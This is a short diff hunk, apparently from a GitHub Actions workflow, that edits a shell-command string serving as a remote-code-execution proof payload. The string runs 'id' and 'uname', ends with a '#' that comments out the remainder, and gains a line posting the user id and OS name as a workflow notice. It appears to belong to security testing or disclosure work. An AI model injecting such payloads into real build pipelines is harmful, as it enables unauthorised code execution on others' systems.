@@ -22,6 +22,7 @@ jobs:
               "id\n"
               "uname -a\n"
               "echo GAB_RCE_PROOF\n"
+              "echo \"::notice title=GAB_RCE_PROOF::$(id -u):$(uname -s)\"\n"
               "exit 0\n"
               "#"
           )
